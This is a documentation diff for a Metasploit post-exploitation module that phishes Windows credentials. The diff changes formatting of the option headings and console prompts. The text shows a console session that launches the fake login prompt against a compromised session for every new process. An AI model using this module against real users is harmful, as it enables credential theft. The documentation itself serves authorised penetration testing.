@@ -17,15 +17,15 @@
 
 ## Options
 
-  **DESCRIPTION**
+### DESCRIPTION
 
   Message shown in the login prompt.
 
-  **PROCESS**
+### PROCESS
 
   Prompt if a specific process is started by the target. (e.g. `calc.exe` or specify * for all processes.)
 
-  **SESSION**
+### SESSION
 
   The session to run this module on.
 
@@ -39,9 +39,9 @@
   msf > use post/windows/gather/phish_windows_credentials
   msf post(windows/gather/phish_windows_credentials) > set SESSION 1
     SESSION => 1
-  msf5 post(windows/gather/phish_windows_credentials) > set PROCESS *
+  msf post(windows/gather/phish_windows_credentials) > set PROCESS *
     PROCESS => *
-  msf5 post(windows/gather/phish_windows_credentials) > exploit
+  msf post(windows/gather/phish_windows_credentials) > exploit
 
   [+] PowerShell is installed.
   [*] Monitoring new processes.
